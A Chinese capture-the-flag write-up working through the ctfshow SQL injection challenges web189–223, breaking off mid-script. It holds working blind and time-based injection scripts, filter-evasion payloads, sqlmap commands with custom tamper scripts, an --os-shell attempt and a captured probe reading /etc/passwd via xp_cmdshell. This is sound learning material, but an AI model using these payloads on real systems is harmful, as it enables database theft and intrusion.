先上payload：`username=1<1&password=0`阿狸师傅tql，逻辑运算符从左到右，所以username只有0|1，也就是相当于`where username!=1`，pass为0是因为密码比较为弱类型，字符串被转为0\
@群主思路：into file写马，但是需要知道绝对路径，(⊙﹏⊙)等我会了来填坑\
@给大佬递茶：username=\`username\` 或者 \`pass\`&pass=0即可登陆

## web189
sql: `$sql = "select pass from ctfshow_user where username = {$username}";`\
```php
//waf
//用户名检测
if(preg_match('/select|and| |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleep|benchmark/i', $username)){
$ret['msg']='用户名非法';
die(json_encode($ret));
}

//密码检测
if(!is_numeric($password)){
$ret['msg']='密码只能为数字';
die(json_encode($ret));
}

//密码判断
if($row['pass']==$password){
    $ret['msg']='登陆成功';
}
```
说是flag在api/index.php文件中，R1chm0nd大佬hint：`load_file`，感谢R1师傅和群内大师傅们的思路，在此给出垃圾脚本，线程崩了改i=251\
本次也学到很多，MySQL里面竟然还有定位函数
>MySQL定位函数（暂时只收集到这几个）：
>- `INSTR(str,substr)` --> 返回字符串 str 中子字符串的第一个出现位置，否则为0
>- `FIND_IN_SET(str,strlist)` --> 返回字符串 str 中子字符串的第一个出现位置，否则为0
>- `LOCATE(substr,str,pos)` --> 返回字符串 str中子字符串substr的第一个出现位置, 起始位置在pos。如若substr 不在str中，则返回值为0
>- `POSITION(substr IN str)` --> 返回子串 substr 在字符串 str 中第一次出现的位置。如果子串 substr 在 str 中不存在，返回值为 0

```python
# encoding:     utf-8
# @Author:      yq1ng
# @Date:        2020-11-27 19:00
# @challenges： web189

import requests

url = "http://460ff67c-68fc-486d-bbaf-cab2c0e2dec3.chall.ctf.show/api/index.php"
data = {"password":"111", "username":""}
i = 0
flag = ""

while True:
    i += 1
    payload = 'concat("user",if((INSTR(load_file("/var/www/html/api/index.php"),"flag{")=%d),1,0))'% i
    data["username"] = payload
    s = requests.post(url, data = data)
    print(data)
    if "529f" in s.text:
        break

while True:
    for x in 'flag{b7c4de-2hi1jk0mn5o3p6q8rstuvw9xyz}':
        payload = 'concat("user",if((mid(load_file("/var/www/html/api/index.php"),%d,1)="%c"),1,0))'% (i,x)
        data["username"] = payload
        s = requests.post(url, data = data)
        print(data)
        if "529f" in s.text:
            flag += x
            break
    if "}" in flag:
        break
    i += 1
    print(flag)
print("Give you flag :"+flag)
```

## web190 - 194
sql: `$sql = "select pass from ctfshow_user where username = '{$username}'";`
```php
//waf
//密码检测
if(!is_numeric($password)){
$ret['msg']='密码只能为数字';
die(json_encode($ret));
}

//密码判断
if($row['pass']==$password){
    $ret['msg']='登陆成功';
}

//TODO:感觉少了个啥，奇怪
if(preg_match('/file|into|ascii|ord|hex|substr|char|left|right|substring/i', $username)){
    $ret['msg']='用户名非法';
    die(json_encode($ret));
}
```
垃圾脚本，table_name用的以前写的脚本，非常慢，可以用column_name的方法，直接猜全部的，先判断数量再逐个判断name只是为了好看。。。大佬笑笑就好，自行发挥，payload不限，我懒得改了。。。优化了，在下面
```python
# encoding: utf-8
# @Author:  yq1ng
# @Date:    2020-11-17 17:30

import requests

url = 'http://af606d85-dee0-462e-8ef0-6718c277c25d.chall.ctf.show/api/'
data = {"username":"","password":"1"}
tb_num = 0
tb_length = 0
tb_name = ''
tb_list = []
all_column_len=0
column_name = ''
flag = ''

#table_num
print("\nJudging the number of tables in the database...")
for x in range(1,100):
    payload = "'or (select count(*) from information_schema.tables where table_schema=database())=%d#"% x
    data["username"] = payload
    #print(data)
    r = requests.post(url,data = data)
    print("\r[+]There are %d tables in this database"% x,end = '')
    if r"\u5bc6\u7801\u9519\u8bef" in r.text:
        tb_num = x
        break
#table_name
print("\nGetting the table name...")
for x in range(0,tb_num):
    tb_name = ''
    #table_length
    for y in range(1,21):
        payload = "'or (select length(table_name) from information_schema.tables where table_schema=database() limit %d,1)=%d#"% (x,y)
        data["username"] = payload
        r = requests.post(url,data = data)
        #print(url + payload)
        if r"\u5bc6\u7801\u9519\u8bef" in r.text:
            tb_length = y
            #print(tb_length)
            #table_name
            for z in range(1,tb_length+1):
                for i in r'0123456789abcdefghijklmnopqrstuvwxyz-_':
                    payload = "'or (select mid(table_name,%d,1) from information_schema.tables where table_schema=database() limit %d,1)='%c'#"% (z,x,i)
                    data["username"] = payload
                    r = requests.post(url,data = data)
                    #print(data)
                    if r"\u5bc6\u7801\u9519\u8bef" in r.text:
                        tb_name += i
                        break
            print("[+]" + tb_name)
            tb_list.append(tb_name)
            break
print("The table names in this database are：",tb_list)

#column_name
print("\nGuess the column names in the %s table......"% tb_list[0])
for x in range(1,100):
    payload = "' or (select length(group_concat(column_name)) from information_schema.columns where table_name='%s')=%d#"%(tb_list[0],x)
    data["username"] = payload
    #print(data)
    r = requests.post(url,data = data)
    if r"\u5bc6\u7801\u9519\u8bef" in r.text:
        all_column_len = x
        print("[+]All listed lengths are : %d"%(all_column_len-1))
        break
for x in range(1,all_column_len+1):
    for y in r'1234567890abcdefghijklmnopqrstuvwxyz-_,':
        payload = "'or (select mid(group_concat(column_name),%d,1) from information_schema.columns where table_name='%s')='%c'#"%(x,tb_list[0],y)
        data["username"] = payload
        r = requests.post(url,data = data)
        if r"\u5bc6\u7801\u9519\u8bef" in r.text:
            column_name += y
            break
print("[+]The column name in the %s table is %s"%(tb_list[0],column_name))

#flag
print("\nGetting the flag......")
for x in range(1,100):
    for y in r'flag{b7c4de-2hi1jk0mn5o3p6q8rstuvw9xyz}':
        payload = "'or (select mid(group_concat(f1ag),%d,1) from %s)='%c'#"%(x,tb_list[0],y)
        data["username"] = payload
        #print(data)
        r = requests.post(url,data = data)
        if r"\u5bc6\u7801\u9519\u8bef" in r.text:
            flag += y
            print("\r[+]The flag is %s"% flag,end = '')
            break
    if '}' in flag:
        break
```
大佬笑笑就好，嘿嘿
```python
# encoding: utf-8
# @Author:  yq1ng
# @Date:    2020-11-17 17:30

import requests

url = 'http://c7a0f777-8dd9-4fa8-a5fd-8f704d8078dc.chall.ctf.show/api/'
data = {"username":"","password":"1"}

tb_name = ''
all_column_len=0
column_name = ''
flag = ''

#table_name
print("\nGetting the table name...")
for x in range(1,100):# 不晓得有多少，尽量大喽，当然，while true也行
    for y in r'ctfshow_abdegijklmnopqruvxyz-,0123456789!':# 根据命名规则，表名是不会有！的，所以嘿嘿
        payload = "'or (select mid(group_concat(table_name),%d,1) from information_schema.tables where table_schema=database())='%c'#"% (x,y)
        data["username"] = payload
        #print(data)
        r = requests.post(url,data = data)
        if r"\u5bc6\u7801\u9519\u8bef" in r.text:
            tb_name += y
            break
    print("\r[+]table name is %s"% tb_name, end = '')
    if y=="!":
        break
print("\n\nDone!The table names in this database are：",tb_name)

guess_tbName = input("\nPlease enter the name of the table you want to guess: ")
#column_name
print("\nGuess the column names in the %s table......"% guess_tbName)
for x in range(1,100):
    payload = "' or (select length(group_concat(column_name)) from information_schema.columns where table_name='%s')=%d#"%(guess_tbName,x)
    data["username"] = payload
    #print(data)
    r = requests.post(url,data = data)
    if r"\u5bc6\u7801\u9519\u8bef" in r.text:
        all_column_len = x
        print("[+]All listed lengths are : %d"%(all_column_len-1))
        break
for x in range(1,all_column_len+1):
    for y in r'1234567890abcdefghijklmnopqrstuvwxyz-_,':
        payload = "'or (select mid(group_concat(column_name),%d,1) from information_schema.columns where table_name='%s')='%c'#"%(x,guess_tbName,y)
        data["username"] = payload
        r = requests.post(url,data = data)
        if r"\u5bc6\u7801\u9519\u8bef" in r.text:
            column_name += y
            break
    print("\r[+]The column name in the %s table is %s"%(guess_tbName,column_name), end = '')

guess_flag = input("\n\nOkay, we're getting a flag. Tell me the list:")
#flag
print("\nGetting the flag......")
for x in range(1,100):
    for y in r'flag{b7c4de-2hi1jk0mn5o3p6q8rstuvw9xyz}':
        payload = "'or (select mid(group_concat(%s),%d,1) from %s)='%c'#"%(guess_flag,x,guess_tbName,y)
        data["username"] = payload
        #print(data)
        r = requests.post(url,data = data)
        if r"\u5bc6\u7801\u9519\u8bef" in r.text:
            flag += y
            print("\r[+]The flag is %s"% flag,end = '')
            break
    if '}' in flag:
        break
```

## web195
sql:`$sql = "select pass from ctfshow_user where username = {$username};";`
```php
//waf
//密码检测
if(!is_numeric($password)){
$ret['msg']='密码只能为数字';
die(json_encode($ret));
}

//密码判断
if($row['pass']==$password){
    $ret['msg']='登陆成功';
}

//TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧
if(preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\'|\"|select|union|or|and|\x26|\x7c|file|into/i', $username)){
$ret['msg']='用户名非法';
die(json_encode($ret));
}

if($row[0]==$password){
    $ret['msg']="登陆成功 flag is $flag";
}
```
这题记录的有点迷了，师傅们仅作参考，搞不懂当时咋想的了，应该直接更密码就可以了\
开始用的``admin;update`ctfshow_user`set`pass`=1;``，一直不对，想了想，字符串需要引号啊，引号又被ban了，所以改用户名为数字就好\
payload:``1;update`ctfshow_user`set`username`=1;`` `password=1`，不能登录的话就把pass也更新为1``1;update`ctfshow_user`set`pass`=1;``

## web196
sql: `  $sql = "select pass from ctfshow_user where username = {$username};";`
```php
waf:
  //TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧
  if(preg_match('/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\'|\"|select|union|or|and|\x26|\x7c|file|into/i', $username)){
    $ret['msg']='用户名非法';
    die(json_encode($ret));
  }

  if(strlen($username)>16){
    $ret['msg']='用户名不能超过16个字符';
    die(json_encode($ret));
  }

  if($row[0]==$password){
      $ret['msg']="登陆成功 flag is $flag";
  }
```
这题略坑，说是过滤`select`但是没过滤，直接`1;select(1)` pass: `1`过了\
用户名没有为1的，所以返回的结果集是后面的，不用纠结`$row[0]==$password`

## web197 - 200
拼接sql：`$sql = "select pass from ctfshow_user where username = {$username};";`

```php
//waf
//TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧
if('/\*|\#|\-|\x23|\'|\"|union|or|and|\x26|\x7c|file|into|select|update|set|create|drop|\(|\,/i', $username)){
$ret['msg']='用户名非法';
die(json_encode($ret));
}

if($row[0]==$password){
    $ret['msg']="登陆成功 flag is $flag";
}
```
通杀非预期（骚气阿狸大佬的思路）：username:`1;show tables;`，pass:`ctfshow_user`，能做到这应该也懂原理

## web201
~~玩会sqlmap，189往后先搁置了哈哈哈哈，系列题目，直接dump了~~\
`py2 .\sqlmap.py -u http://3b960f3f-27df-4014-a22f-e075453fe298.chall.ctf.show/api/index.php?id=1 --referer=ctf.show  --dbms=mysql -D ctfshow_web -T ctfshow_user -C pass --dump --headers="Content-Type: text/plain"`

## web203
>--method=* 调整请求方式

` py2 .\sqlmap.py -u "http://695acb0a-fd61-42e7-866b-1ffa3b15f5e0.chall.ctf.show/api/index.php" --method=PUT --data="id=1" --referer=ctf.show --headers="Content-Type: text/plain" --dbms=mysql -D ctfshow_web -T ctfshow_user -C pass --dump`

## web204
hint：cookie\
`py2 .\sqlmap.py -u "http://d992d54c-ff57-4d7f-9667-b6f96906eadc.chall.ctf.show/api/index.php" --method=PUT --data="id=1" --referer=ctf.show --headers="Content-Type: text/plain" --cookie="*your cookie*" --dbms=mysql -D ctfshow_web -T ctfshow_user -C pass --dump`
## web205
>api调用需要鉴权

在`URL/js/select.js`发现`api/getToken.php`，sqlmap在此鉴权，本次库、表、字都有所改变\
>`--batch` --> 静默选项，sqlmap自动确认\
`--safe-url=SAFEURL` --> 设置在测试目标地址前访问的安全链接\
`--safe-freq=SAFE..` --> 设置两次注入测试前访问安全链接的次数

爆库：`py2 .\sqlmap.py -u "http://5d767ccc-4f5b-4671-906a-ae6e7e2e483b.chall.ctf.show/api/index.php" --method=PUT --data="id=1" --referer=ctf.show --headers="Content-Type: text/plain" --safe-url="http://5d767ccc-4f5b-4671-906a-ae6e7e2e483b.chall.ctf.show/api/getToken.php" --safe-freq=1 --dbms=mysql --dbs --batch`\
爆表：`前面相同  --dbms=mysql -D ctfshow_web --tables --batch`\
爆字段：`--dbms=mysql -D ctfshow_web -T ctfshow_flax --dump --batch`
## web206
>sql需要闭合\
`--prefix=PREFIX` --> 攻击载荷的前缀\
`--suffix=SUFFIX` --> 攻击载荷的后缀

database:`py2 .\sqlmap.py -u "http://979152ce-ff3e-452d-80f1-e4723f247b66.chall.ctf.show/api/index.php" --method=PUT --data="id=1" --referer=ctf.show --headers="Content-Type: text/plain" --safe-url="http://979152ce-ff3e-452d-80f1-e4723f247b66.chall.ctf.show/api/getToken.php" --safe-freq=1 --dbms=mysql --dbs --batch --prefix="')" --suffix="and ('y')=('y"`\
tables: `ctfshow_flaxc` and `ctfshow_user`\
`--dbms=mysql -D ctfshow_web --tables --batch --prefix="')" --suffix="and ('y')=('y"`\
column: `--dbms=mysql -D ctfshow_web -T ctfshow_flaxc --dump --batch --prefix="')" --suffix="and ('y')=('y"`
一开始没爆出来，出了这个
```
+---------+---------+---------+
| id      | tes     | flagv   |
+---------+---------+---------+
| <blank> | <blank> | <blank> |
+---------+---------+---------+
```
就加了`-C flagv`参数，got it\
突然想知道sqlmap怎么爆破的，加上`--proxy=http://127.0.0.1:8080`，bp抓包看看

1. 先请求了鉴权页面`GET /api/getToken.php`,然后`PUT /api/index.php` `id=1` 
2. 循环第一步，每次先鉴权再上payload
3. 先用bool盲注试了一下，再用报错，最后时间盲注

前面一堆看不懂的操作，从我看懂的开始（不懂的也谷歌不到）\
- 进行xss？还用了目录穿越读文件。。不懂\
    `7178 AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert("XSS")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#`
- 报错\
  `1') AND (SELECT 5989 FROM(SELECT COUNT(*),CONCAT(0x716b626271,(SELECT (ELT(5989=5989,1))),0x71767a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)and ('y')=('y`
- 时间盲注\
  `1') AND SLEEP(5)and ('y')=('y`
- 依次增加字段数\
  `1') UNION ALL SELECT NULL,NULL,NULLand ('y')=('y`
- 再次验证sleep\
  `id=1') AND 8923=IF((49=49),SLEEP(5),8923)and ('y')=('y`
- 判断表中记录\
  `id=1') AND 4849=IF((ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM ctfshow_web.ctfshow_flaxc),1,1))>49),SLEEP(5),4849)and ('y')=('y`
  再判断是否等于49：`!=49`
- 开始判断内容了，似乎是二分法\
  `id=1') AND 2696=IF((ORD(MID((SELECT IFNULL(CAST(flagv AS CHAR),0x20) FROM ctfshow_web.ctfshow_flaxc ORDER BY flagv LIMIT 0,1),1,1))>151259),SLEEP(5),2696)and ('y')=('y`\
我能看懂的流程也就这么多，应该会有借鉴payload的时候，前面七七八八的pl真是不懂，response也没东西，不晓得sqlmap是在干嘛，但应该是有用的，有兴趣可以抓包搜一下pl

## web207
>`--tamper` 的初体验\
waf：`preg_match('/ /', $str)`\
`--current-db` 检索当前使用的数据库名称\
`--threads=num` 线程

要上攻击载荷了，就是编码一些字符，查看js还是有鉴权，waf过滤了空格，攻击载荷可以在`sqlmap\tamper`目录里面看到\
时间盲注，直接爆当前数据库就好，不然等的心累\
database: `py2 .\sqlmap.py -u "http://050a59e1-204c-45f2-9d4c-1856ee80a196.chall.ctf.show/api/index.php" --method=PUT --data="id=1" --referer=ctf.show --headers="Content-Type: text/plain" --safe-url="http://050a59e1-204c-45f2-9d4c-1856ee80a196.chall.ctf.show/api/getToken.php" --safe-freq=1 --dbms=mysql --current-db --dump --batch --prefix="')" --suffix="and ('y')=('y" --tamper=space2comment`\
额，上面的直接给我把库和表都跑出来了，它还不尽兴，想一下把数据都跑出来，但是时间盲注太慢了，我只要flag就行

flag: `  -D ctfshow_web -T ctfshow_flaxca -C flagvc --dump`最后加了个`--threads=3`时间盲注太慢了，加了个线程
## web208
>`$id = str_replace('select', '', $id);`\
`preg_match('/ /', $str)`
```php
//对传入的参数进行了过滤
// $id = str_replace('select', '', $id);
  function waf($str){
   return preg_match('/ /', $str);
  }
```
继续加载荷，过滤了`select`和空格\
因为校园网+代理问题，一直302，故sqlmap暂时搁置，以后有机会再写，可以先看[Y4大佬的博客](https://y4tacker.blog.csdn.net/article/details/110144623)\
[11.29补]: 怎么说呢，出题人失误，select未匹配大小写，所以和上一题一样。。。因为sqlmap跑的关键字全是大写的根本匹配不到哈哈哈

## web209
sql：`$sql = "select id,username,pass from ctfshow_user where id = '".$id."' limit 0,1;";`\
waf: `preg_match('/ |\*|\=/', $str);`\
like代替=，自己写tamper，基础教程[点此](https://y4er.com/post/sqlmap-tamper/)，一开始照着sqlmap自带的tamper魔改了一下发现，database和tables、columns都可以跑出来，但是flag不能出，又去参考Y4大佬的博客，okk更改过程写在代码里了\
最终payload：` py2 .\sqlmap.py -u "http://aad8992e-a4a8-4c56-9921-fa1277ac5427.chall.ctf.show/api/index.php" --method=PUT --data="id=1" --referer=ctf.show --headers="Content-Type: text/plain" --safe-url=http://aad8992e-a4a8-4c56-9921-fa1277ac5427.chall.ctf.show/api/getToken.php --safe-freq=1 --tamper="ctfshow_web209" --prefix="'" --dbms=mysql -D ctfshow_web -T ctfshow_flav -C ctfshow_flagx --dump --batch`
```python
# encoding:     utf-8
# @Author:      yq1ng
# @Date:        2020-11-29 15:10
# @challenges： web209

from lib.core.enums import PRIORITY
__priority__ = PRIORITY.NORMAL # 当前脚本调用优先等级

def dependencies(): # 声明当前脚本适用/不适用的范围，可以为空。
	pass

def tamper(payload, **kwargs): # 用于篡改Payload、以及请求头的主要函数
    payload = web209(payload)
    return payload

def web209(payload):
    retVal = payload

    if payload:
        retVal = ""
        quote, doublequote, firstspace = False, False, False

        for i in xrange(len(payload)):
            if not firstspace:
                if payload[i].isspace():
                    firstspace = True
                    retVal += chr(0x0a)
                    continue

            elif payload[i] == '\'':
                quote = not quote

            elif payload[i] == '"':
                doublequote = not doublequote

            elif payload[i] == "=":
                retVal += chr(0x0a)+"like"+chr(0x0a)
                continue

            elif payload[i] == "*":
                #retVal += chr(0x79)//跑flag发现不能用字母，GG
                retVal += chr(0x31)
                continue

            elif payload[i] == " " and not doublequote and not quote:
                retVal += chr(0x0a)
                continue

            retVal += payload[i]

    return retVal
```

## web210
sql：`$sql = "select id,username,pass from ctfshow_user where id = '".$id."' limit 0,1;";`\
return: `return strrev(base64_decode(strrev(base64_decode($id))));` --> 先解码再字符反转再解码再字符反转\
编写tamper思路：反转->编码->反转->编码。参照自带脚本`base64encode.py`\
最终payload：`py2 .\sqlmap.py -u "http://f0d17799-5320-4b1f-9e76-42fc7fc5bf3d.chall.ctf.show/api/index.php" --method=PUT --data="id=1" --referer=ctf.show --headers="Content-Type: text/plain" --safe-url=http://f0d17799-5320-4b1f-9e76-42fc7fc5bf3d.chall.ctf.show/api/getToken.php --safe-freq=1 --tamper="ctfshow_web210" --dbms=mysql -D ctfshow_web -T ctfshow_flavi -C ctfshow_flagxx --dump --batch`
```python
# encoding:     utf-8
# @Author:      yq1ng
# @Date:        2020-11-29 16:20
# @challenges： web210

import base64

from lib.core.enums import PRIORITY
__priority__ = PRIORITY.NORMAL # 当前脚本调用优先等级

def dependencies(): # 声明当前脚本适用/不适用的范围，可以为空。
	pass

def tamper(payload, **kwargs): # 用于篡改Payload、以及请求头的主要函数
    payload = web210(payload)
    return payload

def web210(payload):
    retVal = payload

    if payload:
        retVal = base64.b64encode(payload[::-1].encode("utf-8"))
        retVal = base64.b64encode(retVal[::-1].encode("utf-8"))

    return retVal
```
## web211
在上一题基础上过滤了空格，好说，加上一行替换\
最终payload：`py2 .\sqlmap.py -u "http://5773f437-30b9-4c52-a029-ebbffa67f89a.chall.ctf.show/api/index.php" --method=PUT --data="id=1" --referer=ctf.show --headers="Content-Type: text/plain" --safe-url=http://5773f437-30b9-4c52-a029-ebbffa67f89a.chall.ctf.show/api/getToken.php --safe-freq=1 --tamper="ctfshow_web211" --dbms=mysql -D ctfshow_web -T ctfshow_flavia -C ctfshow_flagxxa --dump --batch`
```python
# encoding:     utf-8
# @Author:      yq1ng
# @Date:        2020-11-29 16:20
# @challenges： web211

import base64

from lib.core.enums import PRIORITY
__priority__ = PRIORITY.NORMAL # 当前脚本调用优先等级

def dependencies(): # 声明当前脚本适用/不适用的范围，可以为空。
	pass

def tamper(payload, **kwargs): # 用于篡改Payload、以及请求头的主要函数
    payload = web211(payload)
    return payload

def web211(payload):
    retVal = payload

    if payload:
        payload = payload.replace(" ","/**/")
        retVal = base64.b64encode(payload[::-1].encode("utf-8"))
        retVal = base64.b64encode(retVal[::-1].encode("utf-8"))

    return retVal
```

## web212
211基础过滤*，似曾相识？对！209的tamper加上！\
最终payload：`py2 .\sqlmap.py -u "http://fe5aacfa-02d5-4596-a385-7bf1a7a3bca1.chall.ctf.show/api/index.php" --method=PUT --data="id=1" --referer=ctf.show --headers="Content-Type: text/plain" --safe-url=http://fe5aacfa-02d5-4596-a385-7bf1a7a3bca1.chall.ctf.show/api/getToken.php --safe-freq=1 --tamper="ctfshow_web212" --dbms=mysql -D ctfshow_web -T ctfshow_flavis -C ctfshow_flagxsa --dump --batch`
```python
# encoding:     utf-8
# @Author:      yq1ng
# @Date:        2020-11-29 17:00
# @challenges： web212

import base64

from lib.core.enums import PRIORITY
__priority__ = PRIORITY.NORMAL # 当前脚本调用优先等级

def dependencies(): # 声明当前脚本适用/不适用的范围，可以为空。
	pass

def tamper(payload, **kwargs): # 用于篡改Payload、以及请求头的主要函数
    payload = web209(payload)
    payload = web212(payload)
    return payload

def web212(payload):
    retVal = payload

    if payload:
        retVal = base64.b64encode(payload[::-1].encode("utf-8"))
        retVal = base64.b64encode(retVal[::-1].encode("utf-8"))

    return retVal

def web209(payload):
    retVal = payload

    if payload:
        retVal = ""
        quote, doublequote, firstspace = False, False, False

        for i in xrange(len(payload)):
            if not firstspace:
                if payload[i].isspace():
                    firstspace = True
                    retVal += chr(0x0a)
                    continue

            elif payload[i] == '\'':
                quote = not quote

            elif payload[i] == '"':
                doublequote = not doublequote

            elif payload[i] == "=":
                retVal += chr(0x0a)+"like"+chr(0x0a)
                continue

            elif payload[i] == "*":
                retVal += chr(0x31)
                continue

            elif payload[i] == " " and not doublequote and not quote:
                retVal += chr(0x0a)
                continue

            retVal += payload[i]

    return retVal
```

## web213
任务：`练习使用--os-shell 一键getshell`\
参考：https://zhuanlan.zhihu.com/p/58007573
1. 查看当前注入点数据库权限是否为dba\
   `py2 .\sqlmap.py -u "http://f35926e1-d8ff-419a-991b-12df1eb20362.chall.ctf.show/api/index.php" --method=PUT --data="id=1" --referer=ctf.show --headers="Content-Type: text/plain" --safe-url=http://f35926e1-d8ff-419a-991b-12df1eb20362.chall.ctf.show/api/getToken.php --safe-freq=1 --tamper="ctfshow_web212" --dbms=mysql --is-dba --batch`\
    ```
    [17:23:47] [INFO] retrieved: root@localhost
    current user is DBA: True
    ```
2. 寻找绝对路径\
   `py2 .\sqlmap.py -u "http://f35926e1-d8ff-419a-991b-12df1eb20362.chall.ctf.show/api/index.php" --method=PUT --data="id=1" --referer=ctf.show --headers="Content-Type: text/plain" --safe-url=http://f35926e1-d8ff-419a-991b-12df1eb20362.chall.ctf.show/api/getToken.php --safe-freq=1 --tamper="ctfshow_web212" --dbms=mysql --sql-shell --batch`\
   `select @@datadir;` --> 数据库绝对路径 --> `/var/lib/mysql/`\
   `select @@basedir;` --> MySql安装路径 --> `/usr`
3. getshell\
   失败了，等着填坑，提示根目录不对。。

## web214
[11.29补]: 忘了214是时间盲注了，我以为是sqlmap，215脚本拿来用，不过是数字型注入，payload：`-1 or(if(left((select %s from %s),%d)='%s',sleep(3),1))`，还是要多跑两边，强烈建议`left()`截取函数，懒得改下面的了，参考表名：`ctfshow_flagx`，参考列名：`flaga`

## web215
提示查询给了单引号，其他全没有，真就闭着眼睛注呗，由于是先做的233，结果直接拿来用了，一个字：慢！！！太慢了！~~有时flag不准~~，跑了228S。。。学着写线程了，估计明天才能出了，这两天课多呜呜呜。我回来了，太菜了写不出来，进程锁加上又太慢，师傅们写了请务必让本菜鸡参考一下，在此非常感谢师傅
```python
# encoding:     utf-8
# @Author:      yq1ng
# @Date:        2020-11-25 21:00
# @challenges： web215

import requests

url = "http://31bee14e-12a1-4dff-89f1-60ba46a1baaa.chall.ctf.show/api/index.php"
data = {"debug":1, "ip":""}
tb_name = ''
column_name = ''
flag = ''

for i in range(1,100):
    for j in r'ctfshow_abdegijklmnopqruvxyz-,1234567890!':
        payload = "-1'or(if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1)='%c',sleep(3),1))and'1'='1"% (i,j)
        data["ip"] = payload
        #print(data)
        r = requests.post(url, data = data)
        time = r.elapsed.total_seconds()
        #print(time)#获取响应时间
        if time > 2:
            tb_name += j
            break
    print("\r[+]table name is %s"% tb_name, end = '')
    if j == "!":
        break

guess_tbName = input("\nPlease enter the name of the table you want to guess: ")
#column_name
for i in range(1,100):
    for j in r'abcdefghijklmnopqrstuvwxyz_,1234567890!':
        payload = "-1'or(if(substr((select group_concat(column_name) from information_schema.columns where table_name='%s'),%d,1)='%c',sleep(3),1))and'1'='1"% (guess_tbName,i,j)
        data["ip"] = payload
        #print(data)
        r = requests.post(url, data = data)
        time = r.elapsed.total_seconds()
        #print(time)#获取响应时间
        if time > 2:
            column_name += j
            break
    print("\r[+]The column name in the %s table is %s"%(guess_tbName,column_name), end = '')
    if j == "!":
        break

guess_flag = input("\n\nOkay, we're getting a flag. Tell me the list:")
#flag
print("\nGetting the flag......")
for i in range(1,100):
    for j in r'flag{b7c4de-2hi1jk0mn5o3p6q8rstuvw9xyz}':
        payload = "-1'or(if(substr((select %s from %s),%d,1)='%c',sleep(3),1))and'1'='1"% (guess_flag,guess_tbName,i,j)
        data["ip"] = payload
        #print(data)
        r = requests.post(url, data = data)
        time = r.elapsed.total_seconds()
        #print(time)#获取响应时间
        if time > 2:
            flag += j
            break
    print("\r[+]The flag is %s"% flag,end = '')
    if j == "}":
        break
```

## web216
和215一样，改改pl：`'MQ==')or(if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1)='%c',sleep(2),1)`，看了[Y4师傅的脚本](https://y4tacker.blog.csdn.net/article/details/110144623)，不会，呜呜呜，看都看不懂，俺菜死了，建议看看Y4师傅的，俺的遍历跑了4min，Y4师傅的脚本建议多跑两边，我跑了三次，三次都不一样

## web217
sql: `where id = ($id);`
```php
//waf
    //屏蔽危险分子
    function waf($str){
        return preg_match('/sleep/i',$str);
    } 
```
时间盲注除了`sleep()`还有`BENCHMARK()`，所以把pl的`sleep(2)`换成`BENCHMARK(3500000,md5('yq1ng')`即可，这个猜测正确返回时间为2.35S，本地测试很快，一开始传的返回9S，计算了一下取了其1/4值
>`BENCHMARK(n, exp)` --> 测试一些函数的执行速度\
参数介绍：第一个是执行的次数，第二个是要执行的函数或者是表达式\
eg:`BENCHMARK(3500000,md5('yq1ng')`测试md5加密yq1ng 3500000次的时间，依次来达到延时效果

## web218
好家伙，在上一题基础上过滤了`BENCHMARK()`，不过还能用笛卡尔积去达到延时效果，参见[此博客](https://www.cnblogs.com/c1e4r/articles/9060525.html)，将`BENCHMARK()`改为`(SELECT count(*) FROM information_schema.columns A, information_schema.schemata B, information_schema.schemata C, information_schema.schemata D,information_schema.schemata E, information_schema.schemata F)`即可，延时为1S，可以自己先测测再用

## web219
这次屏蔽了`rlike`，上题思路应该是用正则匹配来达到延时效果，例如：`select rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');`，本地测试出现`ERROR 3699 (HY000): Timeout exceeded in regular expression match.`，故未使用，本方法参见[MySQL时间盲注五种延时方法](https://www.cdxy.me/?p=789)\
还是上题脚本，给个参考，表名：`ctfshow_flagxca`，列名：`flagaabc`，flag一共42位，格式：`flag{3b75b8d2-fe1b-4e47-a2db-70cc9c8e2091}`，一遍可能不成功，多试几次，我试了六七次呜呜呜，再也不想做时间盲注了，截取单个字符一直不行可以试试`left()`每次截取少量字符串，多试几次，奥里给\
给出参考表名：`ctfshow_flagxcac`，列名：`flagaabcc`

## web220
最后一题盲注了，过滤挺多：`preg_match('/sleep|benchmark|rlike|ascii|hex|concat_ws|concat|mid|substr/i',$str);`看来上一题的姿势挺多的，俺想不出来预期解，所以还是上一题脚本，等群主出预期，占坑

## web221
sql：`$sql = select * from ctfshow_user limit ($page-1)*$limit,$limit;`\
无过滤，提示：`//拿到数据库名字就算你赢`\
参考[P牛文章](https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html)\
在`LIMIT`后面可以跟两个函数，`PROCEDURE` 和 `INTO`，into需要写权限，一般不常见，但是`PROCEDURE`在msyql5.7以后已经弃用，8.0直接删除了。。。[官方文档在此](https://www.docs4dev.com/docs/zh/mysql/5.7/reference/procedure-analyse.html)\
payload：`URL/api/?page=1&limit=1 procedure analyse(extractvalue(rand(),concat(0x3a,database())),1)`，数据库名就是flag

## web222 | 223
我的脚本删了，幸好space man师傅还留着，在此感谢
```python
# encoding: utf-8
# @Author:  yq1ng
# @Date:    2020-11-17 17:30

import requests
import time

url = input("Okay, Input your url: ")

tb_name = ''
all_column_len=0
column_name = ''
flag = ''

def creat_num(n):
    ret = "y"
    if n == 0:
        ret = ""
    elif n == 1:
        return ret
    else:
        for x in range(n-1):
            ret += "y"
    return ret


#table_name
print("\nGetting the table name...")
for x in range(1,100):# 不晓得有多少，尽量大喽，当然，while true也行
    for y in r'ctfshow_abdegijklmnopqruvxyz-,0123456789!':# 根据命名规则，表名是不会有！的，所以嘿嘿
